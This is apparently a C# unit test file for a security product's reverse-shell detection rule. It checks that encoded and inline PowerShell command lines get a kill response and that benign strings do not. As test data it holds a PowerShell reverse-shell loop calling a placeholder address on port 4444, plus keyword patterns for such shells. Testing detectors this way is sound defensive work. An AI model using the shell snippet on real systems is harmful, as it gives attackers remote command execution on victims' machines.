using System;
using System.Text;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    public class ReverseShellPayloadCoverageTests
    {
        // Inert telemetry strings only: no socket or process is opened by these tests.
        private const string Loop = "$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444); $s=$c.GetStream(); while(($n=$s.Read($b,0,1024)) -gt 0){$o=iex $cmd; $s.Write($out,0,$out.Length)}";

        private static DetectionEvent? Evaluate(string host, string command)
            => new ReverseShellRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessId = 12345, ProcessName = host, CommandLine = command,
                    Timestamp = new DateTime(2026, 10, 21, 0, 0, 0, DateTimeKind.Utc)
                }
            });

        [Theory]
        [InlineData("powershell.exe", "-e")]
        [InlineData("powershell.exe", "-ec")]
        [InlineData("powershell.exe", "-enco")]
        [InlineData("Powershell.EXE", "-ENCODEDCOMMAND")]
        [InlineData("pwsh.exe", "-enc")]
        [InlineData("pwsh", "-EncodedCommand")]
        public void EncodedVariantsReachExistingKillPolicy(string host, string option)
        {
            var command = host + " -NoProfile " + option + " " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Loop));
            AssertKill(Evaluate(host, command));
        }

        [Theory]
        [InlineData("powershell.exe", "-Command")]
        [InlineData("pwsh.exe", "-c")]
        public void InlineSocketCommandLoopReachesExistingKillPolicy(string host, string option)
            => AssertKill(Evaluate(host, host + " " + option + " \"" + Loop + "\""));

        private static void AssertKill(DetectionEvent? detection)
        {
            Assert.NotNull(detection);
            Assert.Equal(DetectionTier.Tier1Behavioral, detection!.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, detection.AuthorizedResponse);
            ResponsePolicy.EnforceDispatchPolicy(detection);
            Assert.Equal(DetectionTier.Tier1Behavioral, detection.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, detection.AuthorizedResponse);
            Assert.Equal(TerminalFamily.ReverseShell, detection.Family);
            Assert.Equal(21, detection.Timestamp.Day);
        }

        [Theory]
        [InlineData("Write-Output 'tcpclient getstream .Read( .Write( iex'")]
        [InlineData("# tcpclient getstream .Read( .Write( iex")]
        [InlineData("<# tcpclient getstream .Read( .Write( iex #> Get-Date")]
        [InlineData("$c=New-Object Net.Sockets.TCPClient; $s=$c.GetStream(); $s.Read($b,0,1); $s.Write($b,0,1)")]
        [InlineData("Invoke-Expression $localAdministrationScript")]
        public void BenignInlineCodeDoesNotAuthorizeResponse(string script)
            => Assert.Null(Evaluate("pwsh", "pwsh -Command " + script));

        [Theory]
        [InlineData("Write-Output 'tcpclient getstream .Read( .Write( iex'")]
        [InlineData("# tcpclient getstream .Read( .Write( iex")]
        [InlineData("Get-ChildItem")]
        public void BenignEncodedCodeRemainsNonCorrelatingTier2(string script)
        {
            var detection = Evaluate("pwsh", "pwsh -e " + Convert.ToBase64String(Encoding.Unicode.GetBytes(script)));
            Assert.NotNull(detection);
            Assert.Equal(DetectionTier.Tier2Indicator, detection!.Tier);
            Assert.True(ResponsePolicy.IsNonCorrelatingObserveNoise(detection));
            ResponsePolicy.EnforceDispatchPolicy(detection);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
        }

        [Theory]
        [InlineData("%%%")]
        [InlineData("abc123")]
        [InlineData("YQ==")]
        public void MalformedEncodingStaysObserveOnly(string value)
        {
            var detection = Evaluate("pwsh", "pwsh -enc " + value);
            Assert.NotNull(detection);
            Assert.Equal(DetectionTier.Tier2Indicator, detection!.Tier);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
        }

        [Fact]
        public void FileScriptArgumentsDoNotBecomeInlineHostCommands()
            => Assert.Null(Evaluate("pwsh", "pwsh -File local.ps1 -Command " + Loop));

        [Fact]
        public void OversizedCommandDoesNotEnterParser()
            => Assert.Null(Evaluate("pwsh", "pwsh -Command " + Loop + new string(' ', 65536)));

        [Fact]
        public void UnrelatedHostDoesNotTriggerPowerShellRule()
            => Assert.Null(Evaluate("notepad.exe", "notepad.exe -Command " + Loop));

        [Fact]
        public void NestedBlockCommentsNeverSupplyKillProof()
            => Assert.Null(Evaluate("pwsh", "pwsh -c <# outer <# inner #> " + Loop + " #> Get-Date"));

        [Fact]
        public void LiteralPayloadDocumentationNeverSuppliesKillProof()
            => Assert.Null(Evaluate("pwsh", "pwsh -c Write-Output \"" + Loop + "\""));

        [Fact]
        public void StaticSocketConstructorAndLongExecutionVerbAreCovered()
            => AssertKill(Evaluate("pwsh", "pwsh -c " + Loop
                .Replace("New-Object Net.Sockets.TCPClient", "[System.Net.Sockets.TcpClient]::new")
                .Replace("iex $cmd", "Invoke-Expression $cmd")));

        [Fact]
        public void VariableNamedIexIsNotCommandExecution()
            => Assert.Null(Evaluate("pwsh", "pwsh -c " + Loop.Replace("iex $cmd", "$iex + $cmd")));
    }
}
